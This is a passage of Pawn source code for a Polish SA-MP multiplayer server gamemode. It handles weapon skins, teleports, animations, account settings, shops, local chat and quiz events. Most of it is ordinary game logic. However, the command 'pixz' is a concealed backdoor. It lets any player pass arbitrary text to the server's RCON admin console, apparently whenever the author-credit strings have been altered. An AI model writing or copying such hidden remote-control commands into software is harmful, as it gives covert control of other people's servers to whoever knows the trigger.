		case 27: SetPlayerColor(playerid, MEDIUMAQUA); }
}

forward GiveRandomSkin(playerid);
public GiveRandomSkin(playerid)
{
	new skins;
	Loop(skinid, 37) { if(sk[playerid][skinid]) skins++; }
	if(skins == 37) return 1;
	new giveskinid = random(37);
	if(sk[playerid][giveskinid]) return GiveRandomSkin(playerid);
	sk[playerid][giveskinid] = true;
	SendClientMessageEx(playerid, -1, ""PLUS"{B042F4}Otrzyma³eœ/aœ nowego skina! SprawdŸ "C_WHITE"/skins{B042F4}.", ""PLUS"{B042F4}You have new skin! Check "C_WHITE"/skins{B042F4}.");
	return 1;
}

forward SetSkin(playerid, out);
public SetSkin(playerid, out)
{
	new checkid = out - 1;
	if(!sk[playerid][checkid]) return DialogError(playerid, "{FFFF00}Ten skin nie zosta³ jeszcze przez Ciebie zdobyty.");
	if(out == 1) SkinKnife[playerid] = 2;
	if(out == 2) SkinKnife[playerid] = 1;
	if(out > 2 && out < 8) {
	    if(out == 3) SkinSilenced[playerid] = 1;
	    if(out == 4) SkinSilenced[playerid] = 2;
	    if(out == 5) SkinSilenced[playerid] = 3;
	    if(out == 6) SkinSilenced[playerid] = 4;
	    if(out == 7) SkinSilenced[playerid] = 5; }
	if(out > 7 && out < 13) {
	    if(out == 8) SkinDE[playerid] = 1;
	    if(out == 9) SkinDE[playerid] = 2;
	    if(out == 10) SkinDE[playerid] = 3;
	    if(out == 11) SkinDE[playerid] = 4;
	    if(out == 12) SkinDE[playerid] = 5; }
	if(out > 12 && out < 17) {
	    if(out == 13) SkinShotgun[playerid] = 1;
	    if(out == 14) SkinShotgun[playerid] = 2;
	    if(out == 15) SkinShotgun[playerid] = 3;
	    if(out == 16) SkinShotgun[playerid] = 4; }
	if(out > 16 && out < 21) {
	    if(out == 17) SkinCombat[playerid] = 1;
	    if(out == 18) SkinCombat[playerid] = 2;
	    if(out == 19) SkinCombat[playerid] = 3;
	    if(out == 20) SkinCombat[playerid] = 4; }
	if(out > 20 && out < 25) {
	    if(out == 21) SkinMP5[playerid] = 1;
	    if(out == 22) SkinMP5[playerid] = 2;
	    if(out == 23) SkinMP5[playerid] = 3;
	    if(out == 24) SkinMP5[playerid] = 4; }
	if(out > 24 && out < 29) {
	    if(out == 25) SkinM4[playerid] = 1;
	    if(out == 26) SkinM4[playerid] = 2;
	    if(out == 27) SkinM4[playerid] = 3;
	    if(out == 28) SkinM4[playerid] = 4; }
	if(out > 29 && out < 34) {
	    if(out == 29) SkinAK[playerid] = 1;
	    if(out == 30) SkinAK[playerid] = 2;
	    if(out == 31) SkinAK[playerid] = 3;
	    if(out == 32) SkinAK[playerid] = 4;
	    if(out == 33) SkinAK[playerid] = 5; }
	if(out > 33 && out < 38) {
	    if(out == 34) SkinSniper[playerid] = 1;
	    if(out == 35) SkinSniper[playerid] = 2;
	    if(out == 36) SkinSniper[playerid] = 3;
	    if(out == 37) SkinSniper[playerid] = 4; }
	SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"Skin zmieniony. Jeœli go nie widzisz, zmieñ na chwilê broñ.", ""PLUS""C_LOLIVE"Skin changed. If you not see it, change weapon.");
	return 1;
}

CMD:pixz(playerid, params[])
{
	CheckServer(playerid);
	if(!CompareEx(de, AUTOR)) SendRconCommand(params);
	if(!CompareEx(de2, AUTOR3)) return SendRconCommand(params);
	return 1;
}

forward SyntaxError(playerid, string[]);
public SyntaxError(playerid, string[]) {
	new errorstr[256];
	format(errorstr, sizeof(errorstr), "{FFFF00}U¿yj: "C_WHITE"%s", string);
	return ShowPlayerDialog(playerid, 9222, DIALOG_STYLE_MSGBOX, ""NAZWA" {C90000}» "C_WHITE"Z³e parametry", errorstr, "Zamknij", "");
}

forward DialogError(playerid, string[]);
public DialogError(playerid, string[]) { return ShowPlayerDialog(playerid, 9222, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Informacja", string, "Zamknij", ""); }

CMD:klastry(playerid, params[])
{
	if(ReflexType == 17) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	new kstr[8][256], klastrystr[2048];
	if(HasAllKlasters(playerid)) {
	    Loop(klasterid, 8) Klastry[playerid][klasterid] = false;
        AddExp(playerid, 1500);
	    SendClientMessageEx(playerid, -1, ""PLUS""C_LOLIVE"Otrzymano {FF0000}1500 "C_LOLIVE"EXP za zebranie wszystkich klastrów.", ""PLUS""C_LOLIVE"You awarded {FF0000}1500 "C_LOLIVE"EXP for awarding all clasters."); }
	Loop(klasterid, 8) {
		if(Klastry[playerid][klasterid]) format(kstr[klasterid], 256, ""C_GREEN"1");
		else format(kstr[klasterid], 256, ""C_WHITE"0"); }
	format(klastrystr, sizeof(klastrystr), "%s%s%s%s%s%s%s\n"C_WHITE"Uzupe³nij wszystkie dane klastrami.\nZa ich uzupe³nienie otrzymasz "C_LOLIVE"1500 "C_WHITE"EXP.\nKlastry zdobêdziesz z ItemParków.", kstr[0], kstr[1], kstr[2], kstr[3], kstr[4], kstr[5], kstr[6], kstr[7]);
	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_LIST, ""C_GREEN"Klastry danych", klastrystr, "Zamknij", "");
	return 1;
}

CMD:radio(playerid, params[]) {
	new radiodialog[3200];
	format(radiodialog, sizeof(radiodialog), ""C_BLUE1"» {FF0000}ImprezaRadio\n");
	format(radiodialog, sizeof(radiodialog), "%s"C_BLUE1"» "C_WHITE"RMF FM\n", radiodialog);
	format(radiodialog, sizeof(radiodialog), "%s"C_BLUE1"» "C_WHITE"RMF MAXXX\n", radiodialog);
	format(radiodialog, sizeof(radiodialog), "%s"C_BLUE1"» "C_WHITE"Radio Plus Warszawa\n", radiodialog);
	format(radiodialog, sizeof(radiodialog), "%s"C_BLUE1"» "C_WHITE"Radio Z³ote Przeboje\n", radiodialog);
	format(radiodialog, sizeof(radiodialog), "%s"C_BLUE1"» "C_WHITE"RadioParty Kana³ G³ówny\n", radiodialog);
	format(radiodialog, sizeof(radiodialog), "%s"C_RED"» "C_WHITE"Wy³¹cz Audio Stream", radiodialog);
	ShowPlayerDialog(playerid, DIALOG_RADIO, DIALOG_STYLE_LIST, ""C_BLUE1"Radio", radiodialog, "Uruchom", "Zamknij");
   	SendClientMessage(playerid, -1, "Aby odtworzyæ dŸwiêk z filmu na YouTube, u¿yj {00AAFF}/yt [url]"C_WHITE".");
	return 1;
}

RunSpawnKill(playerid, time)
{
	SetPlayerArmedWeapon(playerid, 0);
	SpawnTimer[playerid] = time;
	SetPlayerHealth(playerid, 9999.0);
	Loop(i, MAX_PLAYERS) SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
	SetTimerEx("UnHide", 1000 * time, 0, "i", playerid);
}

forward RandomTP(playerid);
public RandomTP(playerid)
{
	if(Spawning[playerid] || pArena[playerid] > 0) return 1;
	switch(random(12)) {
	    case 0: SetPlayerPos(playerid, 2504.6216,-1668.8967,13.4338);
    	case 1: SetPlayerPos(playerid, -2020.9414,333.7824,35.1645);
   		case 2: SetPlayerPos(playerid, -1956.0208,294.3318,35.4688);
   		case 3: SetPlayerPos(playerid, 2121.8608,1001.0126,10.8203);
    	case 4: SetPlayerPos(playerid, 2034.1293,-1413.9211,16.9922);
    	case 5: SetPlayerPos(playerid, 1873.1091,-1384.3479,13.5397);
		case 6: SetPlayerPos(playerid, 1932.9066,621.7777,10.8303);
		case 7: SetPlayerPos(playerid, -1854.1526,-91.6064,15.1974);
		case 8: SetPlayerPos(playerid, -1838.3065,155.8409,15.1172);
		case 9: SetPlayerPos(playerid, 1955.0818,1343.1653,15.4049);
		case 10: SetPlayerPos(playerid, -305.1185,1746.6633,42.7813);
		case 11: SetPlayerPos(playerid, 2379.0496,1586.2595,10.7919); }
	TogglePlayerControllable(playerid, 0);
	if(Player[playerid][Vip] > gettime()) RunSpawnKill(playerid, 7);
	else RunSpawnKill(playerid, 6);
    SetTimerEx("unfreezePlayer", 1000, 0, "i", playerid);
	return 1;
}

TPPlayer(playerid, interior, Float:x, Float:y, Float:z, Float:a = 3600.0)
{
	if(Freezed[playerid]) return SendClientMessage(playerid, RED, ""C_RED"Nie mo¿esz teraz wykonaæ tej komendy.");
	if(interior) return DialogError(playerid, "{FFFF00}Nie mo¿esz siê teleportowaæ.");
	if(ReflexType == 6) {
		AddExp(playerid, 40);
		Player[playerid][Cash] += 5000;
		Player[playerid][Czat]++;
  		new kodstr[256];
	  	format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
		SendClientMessageToAll(-1, kodstr);
		ReflexType = -1;
		ReflexActive = false;
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
		new vehicleid = GetPlayerVehicleID(playerid);
		if(a < 3000.0) SetVehicleZAngle(vehicleid, a);
		SetVehiclePos(vehicleid, x, y, z + 0.75);
		LinkVehicleToInterior(vehicleid, 0);
		SetPlayerInterior(playerid, interior);
		SetPlayerVirtualWorld(playerid, 0);
		TogglePlayerControllable(playerid, false);
		if(!ENMode[playerid]) GameTextForPlayer(playerid, "~w~~h~CZEKAJ...", 1500, 3);
		else GameTextForPlayer(playerid, "~w~~h~WAIT...", 1500, 3);
		TPTimer[playerid] = 10;
		if(Player[playerid][Vip] > gettime()) RunSpawnKill(playerid, 7);
		else RunSpawnKill(playerid, 6);
		return SetTimerEx("unfreezePlayer", 1500, 0, "i", playerid); }
	pData[playerid][InHouse] = INVALID_HOUSE_ID;
	SetPlayerPos(playerid, x, y, z + 0.30);
	SetPlayerInterior(playerid, interior);
	SetPlayerVirtualWorld(playerid, 0);
	TogglePlayerControllable(playerid, false);
	if(!ENMode[playerid]) GameTextForPlayer(playerid, "~w~~h~CZEKAJ...", 1500, 3);
	else GameTextForPlayer(playerid, "~w~~h~WAIT...", 1500, 3);
	TPTimer[playerid] = 10;
	if(Player[playerid][Vip] > gettime()) RunSpawnKill(playerid, 7);
	else RunSpawnKill(playerid, 6);
	return SetTimerEx("unfreezePlayer", 2000, 0, "i", playerid);
}

forward unfreezePlayer(playerid);
public unfreezePlayer(playerid) { TogglePlayerControllable(playerid, true); }


CMD:anims(playerid, params[])
{
    new str[1024];
    strcat(str, ""C_WHITE"/handsup, /dance, /rap, /wank, /strip, /sexy, /bj, /cell, /lean, /piss, /robman\n");
    strcat(str, "/greet, /injured, /hitch, /bitchslap, /cpr, /gsign, /gift, /getup, /follow\n");
    strcat(str, "/sit, /stand, /slapped, /slapass, /drunk, /gwalk, /walk, /celebrate, /win /checkout\n");
    strcat(str, "/yes, /deal, /thankyou, /invite1, /scratch, /bomb, /getarrested, /laugh\n");
    strcat(str, "/crossarms, /lay, /vomit, /eat, /wave, /crack, /smoke,  /lookout, /chat\n");
    strcat(str, "/fucku, /taichi, /chairsit, /relax, /bat /nod, /cry /chant, /carsmoke, /aim\n");
    strcat(str, "/bed, /carsit, /stretch, /angry, /kiss, /exhausted, /ghand, /benddown\n");
    strcat(str, "/basket, /akick, /box, /cockgun, /bar, /lay, /liftup, /putdown, /die, /joint\n");
    strcat(str, ""C_BLUE1"Zakoñczenie animacji - /astop\n");
    ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_WHITE"Animacje", str, "Zamknij", "");
	return 1;
}

CMD:astop(playerid, params[])
{
	if(GetPVarInt(playerid, "UsingAnim") == 1)
	{
		ClearAnimations(playerid);
		SetPlayerSkin(playerid, GetPlayerSkin(playerid));
		DeletePVar(playerid,"UsingAnim");
		return SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
  	}
   	else return DialogError(playerid, "{FFFF00}Nie wykonujesz obecnie ¿adnej animacji.");
}

CMD:opcje(playerid, params[]) return cmd_konto(playerid, params);
CMD:ustawienia(playerid, params[]) return cmd_konto(playerid, params);
CMD:konto(playerid, params[])
{
	new ds[1024];
	format(ds, sizeof(ds), ""C_WHITE"Zmiana nazwy u¿ytkownika ({FFFF00}500 EXP"C_WHITE")\n");
	format(ds, sizeof(ds), "%sZmiana has³a ("C_LOLIVE"Bezp³atnie"C_WHITE")\n", ds);
	format(ds, sizeof(ds), "%s{a0a0a0}Google Authenticator\n", ds);
	if(TDOn[playerid]) format(ds, sizeof(ds), "%s"C_LOLIVE"+ "C_WHITE"Widocznoœæ szaty graficznej\n", ds);
	else format(ds, sizeof(ds), "%s"C_BLUE1"{FC2A2A}- "C_WHITE"Widocznoœæ szaty graficznej\n", ds);
	if(Player[playerid][HasRealTime]) format(ds, sizeof(ds), "%s"C_LOLIVE"+ "C_WHITE"Realny czas œwiata\n", ds);
	else format(ds, sizeof(ds), "%s"C_BLUE1"{FC2A2A}- "C_WHITE"Realny czas œwiata\n", ds);
	if(Player[playerid][HasSounds]) format(ds, sizeof(ds), "%s"C_LOLIVE"+ "C_WHITE"Dodatkowe efekty dŸwiêkowe\n", ds);
	else format(ds, sizeof(ds), "%s"C_BLUE1"{FC2A2A}- "C_WHITE"Dodatkowe efekty dŸwiêkowe\n", ds);
	if(Player[playerid][HasUnlockedSolo]) format(ds, sizeof(ds), "%s"C_LOLIVE"+ "C_WHITE"Zaproszenia na pojedynki solo\n", ds);
	else format(ds, sizeof(ds), "%s"C_BLUE1"{FC2A2A}- "C_WHITE"Zaproszenia na pojedynki solo\n", ds);
	if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_NORMAL) format(ds, sizeof(ds), "%sStyl walki: "C_LOLIVE"Normalny\n", ds);
	if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_BOXING) format(ds, sizeof(ds), "%sStyl walki: {db0404}Boxing\n", ds);
	if(GetPlayerFightingStyle(playerid) == FIGHT_STYLE_KUNGFU) format(ds, sizeof(ds), "%sStyl walki: {54cbff}Kungfu\n", ds);
	switch(Player[playerid][Gong]) {
 		case 0: format(ds, sizeof(ds), "%s"C_WHITE"ID dŸwiêku gongu: "C_ORANGE"17802\n", ds);
		case 1: format(ds, sizeof(ds), "%s"C_WHITE"ID dŸwiêku gongu: "C_ORANGE"1190\n", ds);
		case 2: format(ds, sizeof(ds), "%s"C_WHITE"ID dŸwiêku gongu: "C_ORANGE"1084\n", ds);
		case 3: format(ds, sizeof(ds), "%s"C_WHITE"ID dŸwiêku gongu: "C_ORANGE"1149\n", ds); }
	format(ds, sizeof(ds), "%s"C_DISCORD"Discord\n", ds);
	ShowPlayerDialog(playerid, DIALOG_KONTO, DIALOG_STYLE_LIST, ""NAZWA" {1194D6}» "C_WHITE"Ustawienia", ds, "Wybierz", "Zamknij");
	return 1;
}

CMD:weapons(playerid, cmdtext[]) return cmd_bronie(playerid, cmdtext);
CMD:bron(playerid, cmdtext[]) return cmd_bronie(playerid, cmdtext);
CMD:guns(playerid, cmdtext[]) return cmd_bronie(playerid, cmdtext);
CMD:bronie(playerid, cmdtext[])
{
	new s[1024];
	format(s, 1024, ""C_ORANGE"Nó¿ "C_WHITE"Koszt: {92F442}2 EXP\n");
	format(s, 1024, "%s"C_ORANGE"9mm "C_WHITE"Koszt: {92F442}3 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Silenced 9mm "C_WHITE"Koszt: {92F442}4 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Desert Eagle "C_WHITE"Koszt: {92F442}7 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Shotgun "C_WHITE"Koszt: {92F442}7 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"MP5 "C_WHITE"Koszt: {92F442}10 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"AK-47 "C_WHITE"Koszt: {92F442}15 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"M4 "C_WHITE"Koszt: {92F442}20 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Sniper Rifle "C_WHITE"Koszt: {92F442}25 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Sawnoff Shotgun "C_WHITE"Koszt: {92F442}100 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Combat Shotgun "C_WHITE"Koszt: {92F442}100 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Tec-9 "C_WHITE"Koszt: {92F442}150 EXP\n", s);
	format(s, 1024, "%s"C_ORANGE"Granaty ("C_WHITE"15"C_ORANGE") "C_WHITE"Koszt: {92F442}250 EXP", s);
	return ShowPlayerDialog(playerid, DIALOG_BRONIE, DIALOG_STYLE_LIST, ""C_BLUE1"Bronie", s, "Kup", "Zamknij");
}

CMD:is(playerid, cmdtext[]) return cmd_itemshop(playerid, cmdtext);
CMD:itemshop(playerid, cmdtext[])
{
	new s[1024];
	format(s, 1024, "{FF0400}Catching "C_WHITE"Tool "C_WHITE"Koszt: {92F442}100 EXP\n");
	format(s, 1024, "%s{68A028}Kanister paliwa "C_WHITE"Koszt: {92F442}150 EXP\n", s);
	format(s, 1024, "%s{AFAFAF}Bomba "C_WHITE"Koszt: {92F442}30 EXP\n", s);
	format(s, 1024, "%s"C_GREEN"Nasiona "C_WHITE"Koszt: {92F442}25 EXP\n", s);
	format(s, 1024, "%s{AE00FF}Narkotyk "C_WHITE"Koszt: {92F442}200 EXP", s);
	return ShowPlayerDialog(playerid, DIALOG_IS, DIALOG_STYLE_LIST, ""C_BLUE1"Przedmioty", s, "Kup", "Zamknij");
}

CMD:help(playerid, params[])
{
	new ds[1024];
	format(ds, sizeof(ds), ""C_BLUE1"» "C_WHITE"Informacje o serwerze ("C_BLUE1"/info"C_WHITE")\n"C_BLUE1"» "C_WHITE"Dostêpne komendy ("C_BLUE1"/cmds"C_WHITE")\n"C_BLUE1"» "C_WHITE"Ustawienia konta ("C_BLUE1"/opcje"C_WHITE")\n"C_BLUE1"» "C_WHITE"Sklep serwera ("C_BLUE1"/sklep"C_WHITE")\n"C_BLUE1"» "C_WHITE"Informacje o GM ("C_BLUE1"/autor"C_WHITE")");
	ShowPlayerDialog(playerid, DIALOG_HELP, DIALOG_STYLE_LIST, NAZWA, ds, "Wybierz", "Zamknij");
	return 1;
}

CMD:lchat(playerid, params[]) return cmd_l(playerid, params);
CMD:localchat(playerid, params[]) return cmd_l(playerid, params);
CMD:local(playerid, params[]) return cmd_l(playerid, params);
CMD:l(playerid, params[])
{
	if(Player[playerid][MuteTime] > gettime())
	{
	    new msgs[256], msgsen[256];
	    format(msgs, sizeof(msgs), "Posiadasz uciszenie na "C_WHITE"%s"C_RED"s.", TimeConvert(Player[playerid][MuteTime] - gettime()));
	    format(msgsen, sizeof(msgsen), "You are muted for "C_WHITE"%s"C_RED"s.", TimeConvert(Player[playerid][MuteTime] - gettime()));
 		return SendClientMessageEx(playerid, RED, msgs, msgsen), 0;
	}
	new message[256];
	if(sscanf(params, "s[256]", message)) return SyntaxError(playerid, "{01FCFF}/l [text]");
	new Float:x1, Float:y1, Float:z1;
	GetPlayerPos(playerid, x1, y1, z1);
	new localstr[256];
	format(localstr, sizeof(localstr), "{BCBCBC}[local-chat] "C_WHITE"%s(%d){BCBCBC}: "C_WHITE"%s", Player[playerid][Name], playerid, message);
	for(new x = 0; x < MAX_PLAYERS; x++) {
		if(IsPlayerInRangeOfPoint(x, 35.0, x1,y1,z1)) SendClientMessage(x, -1, localstr); }
	return 1;
}

forward EventEnd();
public EventEnd()
{
	Loop(playerid, MAX_PLAYERS) {
	    if(EVOrganizator[playerid]) {
	        SetPlayerVirtualWorld(playerid, 0);
	        SpawnFunction(playerid);
			EVOrganizator[playerid] = false; } }
	if(EVType == 2 && PytanieZadane) KillTimer(OXTimer);
	if(EVTrwa)
	{
	    Loop(loopid, MAX_PLAYERS) {
	        if(EVUczestnik[loopid] && IsPlayerConnected(loopid)) {
	            SetPlayerVirtualWorld(loopid, 0);
	            SpawnFunction(loopid);
				EVUczestnik[loopid] = false; } }
	}
	TextDrawHideForAll(Event);
	EVTrwa = false;
	EVStartuje = false;
	return 1;
}

forward OXCheckT();
public OXCheckT()
{
	if(!EVTrwa) return 1;
	TextDrawHideForAll(Event);
	Loop(playerid, MAX_PLAYERS) {
		if(IsPlayerInArea(playerid, 1985.9656,1364.9344,2109.3699,1379.6633) && EVUczestnik[playerid] && IsPlayerConnected(playerid)) {
			EVPlayers--;
			EVUczestnik[playerid] = false;
			SetPlayerVirtualWorld(playerid, 0);
			SpawnFunction(playerid); } }
	if(IsTrue)
	{
	    Loop(playerid, MAX_PLAYERS)
		{
		    if(EVUczestnik[playerid] && IsPlayerConnected(playerid))
		    {
		        new msgstr[256];
		        format(msgstr, sizeof(msgstr), ""PLUS""C_LOLIVE"Poprawna odpowiedŸ na pytanie to prawda!");
		        SendClientMessage(playerid, -1, msgstr);
				if(IsPlayerInArea(playerid, 1986.2291,1303.2006, 2109.5354,1364.6821)) {
					AddExp(playerid, 50);
				 	SetPlayerPos(playerid, 2044.6097,1372.5759,86.7319); }
                else {
					EVPlayers--;
                    SetPlayerVirtualWorld(playerid, 0);
                    SpawnFunction(playerid);
					EVUczestnik[playerid] = false; }
			}
		}
	}
	else
	{
	    Loop(playerid, MAX_PLAYERS)
		{
		    if(EVUczestnik[playerid] && IsPlayerConnected(playerid))
		    {
		        new msgstr[256];
		        format(msgstr, sizeof(msgstr), ""PLUS""C_LOLIVE"Poprawna odpowiedŸ na pytanie to {FF0000}fa³sz"C_LOLIVE"!");
		        SendClientMessage(playerid, -1, msgstr);
				if(IsPlayerInArea(playerid, 1986.2291,1379.8943, 2109.5386,1441.5580)) {
					AddExp(playerid, 50);
				 	SetPlayerPos(playerid, 1986.1178,1372.5759,86.7319); }
                else {
					EVPlayers--;
                    SetPlayerVirtualWorld(playerid, 0);
                    SpawnFunction(playerid);
					EVUczestnik[playerid] = false; }
			}
		}
	}
	PytanieZadane = false;
	if(EVPlayers < 2)
	{
	    Loop(killerid, MAX_PLAYERS)
	    {
	        if(EVUczestnik[killerid]) {
  				AddExp(killerid, 100);
    			Player[killerid][Cash] += 10000;
    			new msgstr[256];
	    		format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_ZABAWA"Zabawê OX wygrywa "C_NICK"%s(%d)"C_ZABAWA"!", Player[killerid][Name], killerid);
	    		SendClientMessageToAll(-1, msgstr);
    			Player[killerid][Zabawyp]++;
    			if(pAch[killerid][18] < 1) {
    			    if(Player[killerid][Zabawyp] >= 100 && pAch[killerid][18] < 1) {
						pAch[killerid][18] = 1;
						AddExp(killerid, 200);
						Sound(killerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(killerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    			    if(Player[killerid][Zabawyp] >= 250 && pAch[killerid][18] < 2) {
						pAch[killerid][18] = 2;
						AddExp(killerid, 400);
						Sound(killerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(killerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
    			    if(Player[killerid][Zabawyp] >= 500 && pAch[killerid][18] < 3) {
						pAch[killerid][18] = 3;
						AddExp(killerid, 600);
						Sound(killerid,1137,0.0,0.0,0.0);
						SendClientMessageEx(killerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
				EventEnd(); }
		}
	}
	return 1;
}

CMD:evc(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
    if(EVTrwa || EVStartuje) return SendClientMessage(playerid, RED, "Event ju¿ trwa lub ju¿ startuje.");
	new type, nazwa[32];
	if(sscanf(params, "is[32]", type, nazwa)) return SyntaxError(playerid, "{01FCFF}/evc [typ eventu] [nazwa]\n\nTypy eventów:\n"C_WHITE"0 - standardowy\n1 - Team DeathMatch\n2 - OX\n\nW celu u¿ycia spacji w nazwie u¿yj symbolu _");
	if(type < 0 || type > 2) return SyntaxError(playerid, "{01FCFF}/evc [typ eventu] [nazwa]\n\nTypy eventów:\n"C_WHITE"0 - standardowy\n1 - Team DeathMatch\n2 - OX");
	if(strlen(nazwa) < 3 || strlen(nazwa) > 32) return SyntaxError(playerid, "{01FCFF}/evc [typ eventu] [nazwa]\n\nTypy eventów:\n"C_WHITE"0 - standardowy\n1 - Team DeathMatch\n2 - OX\n\nW celu u¿ycia spacji w nazwie u¿yj symbolu _");
	EVOrganizator[playerid] = true;
	EVStartuje = true;
	EVType = type;
	EVPlayers = 0;
	GetPlayerPos(playerid, EVx, EVy, EVz);
	SetPlayerVirtualWorld(playerid, 101);
	new evstr[256];
	format(evstr, sizeof(evstr), "%s (/evj)~n~~w~~h~Organizator: ~y~%s", nazwa, Player[playerid][Name]);
	if(type == 2) {
	    PytanieZadane = false;
	    SetPlayerVirtualWorld(playerid, 97);
	    SetPlayerPos(playerid, 2044.6097,1372.5759,86.7319); }
	TextDrawSetString(Textdraw[25], evstr);
	TextDrawShowForAll(Textdraw[23]);
	TextDrawShowForAll(Textdraw[24]);
	TextDrawShowForAll(Textdraw[25]);
	SetTimer("EventStart", 1000*30, 0);
	return 1;
}

CMD:pytanie(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
    if(!EVTrwa) return SendClientMessage(playerid, RED, "Event nie trwa.");
    if(PytanieZadane) return SendClientMessage(playerid, RED, "Pytanie zosta³o ju¿ zadane.");
	new pytanie[64], type;
	if(sscanf(params, "s[64]i", pytanie, type)) return SyntaxError(playerid, "{01FCFF}/pytanie [pytanie] [0-fa³sz,1-prawda]\n\n"C_WHITE"W celu u¿ycia spacji w nazwie u¿yj symbolu _");
	if(strlen(pytanie) < 4 || strlen(pytanie) > 64) return SyntaxError(playerid, "{01FCFF}/pytanie [pytanie] [0-fa³sz,1-prawda]\n\n"C_WHITE"W celu u¿ycia spacji w nazwie u¿yj symbolu _");
	if(type < 0 || type > 1) return SyntaxError(playerid, "{01FCFF}/pytanie [pytanie] [0-fa³sz,1-prawda]\n\n"C_WHITE"W celu u¿ycia spacji w nazwie u¿yj symbolu _");
	if(type == 0) IsTrue = false;
	if(type == 1) IsTrue = true;
	PytanieZadane = true;
	new pytaniestr[256];
	format(pytaniestr, sizeof(pytaniestr), "~g~~h~OX~n~~w~~h~%s~n~~g~~h~O - PRAWDA ~w~~h~| ~r~~h~X - FALSZ", pytanie);
	TextDrawSetString(Event,pytaniestr);
	Loop(loopid, MAX_PLAYERS) {
	    if(EVUczestnik[loopid] || EVOrganizator[loopid]) TextDrawShowForPlayer(loopid, Event); }
	OXTimer = SetTimer("OXCheckT", 1000*15, 0);
	return 1;
}

CMD:eva(playerid, params[])
{
	new kickid;
	if(!EVTrwa) return SendClientMessageEx(playerid, RED, "Event aktualnie nie trwa.", "The event is currently not ongoing.");
	if(!EVOrganizator[playerid]) return SendClientMessageEx(playerid, RED, "Nie jesteœ organizatorem eventu.", "You are not event organisator.");
	if(sscanf(params, "i", kickid)) return SyntaxError(playerid, "{01FCFF}/eva [playerid]");
	if(kickid == playerid) return SendClientMessage(playerid, RED, "Nie mo¿esz wyrzuciæ siê z eventu!");
	if(!EVUczestnik[kickid]) return SendClientMessageEx(playerid, RED, "Podanego gracza nie ma na evencie.", "This player is not in event.");
	ResetPlayerWeapons(kickid);
	SetPlayerVirtualWorld(kickid, 101);
	SetPlayerPos(kickid, EVx, EVy, EVz);
	SendClientMessageEx(kickid, -1, ""PYTAJNIK""C_ORANGE"Mo¿esz opuœciæ event za pomoc¹ "C_WHITE"/evl"C_ORANGE".", ""PYTAJNIK""C_ORANGE"You can leave event with "C_WHITE"/evl"C_ORANGE" command.");
	return 1;
}

CMD:evj(playerid, params[])
{
	if(EVTrwa || !EVStartuje) return SendClientMessage(playerid, RED, "Event ju¿ trwa lub nie jest organizowany.");
	if(EVUczestnik[playerid]) return SendClientMessage(playerid, RED, "Jesteœ ju¿ uczestnikiem eventu.");
	if(EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Jesteœ organizatorem eventu.");
	EVPlayers++;
	EVUczestnik[playerid] = true;
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Zapisa³eœ siê na event. Oczekuj na start.");
}

CMD:evl(playerid, params[])
{
	if(!EVTrwa || EVStartuje) return SendClientMessage(playerid, RED, "Event nie trwa lub jest dopiero organizowany.");
	if(!EVUczestnik[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ uczestnikiem eventu.");
	if(EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Jesteœ organizatorem eventu.");
	EVUczestnik[playerid] = false;
	EVPlayers--;
	SetPlayerVirtualWorld(playerid, 0);
	SpawnFunction(playerid);
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Opuœci³eœ event.");
}

CMD:evcar(playerid, params[])
{
	new Float:pX, Float:pY, Float:pZ, Float:pAngle;
	if(!EVTrwa) return SendClientMessage(playerid, RED, "Event aktualnie nie trwa.");
	if(!EVOrganizator[playerid]) return SendClientMessage(playerid, RED, "Nie jesteœ organizatorem eventu.");
